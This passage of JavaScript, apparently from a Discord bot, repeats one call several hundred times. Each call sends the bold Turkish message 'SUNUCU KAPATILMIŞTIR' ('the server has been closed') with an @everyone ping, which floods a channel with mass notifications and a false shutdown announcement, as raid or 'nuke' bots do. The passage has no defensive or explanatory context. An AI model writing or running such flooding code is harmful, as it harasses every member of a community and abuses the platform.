        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
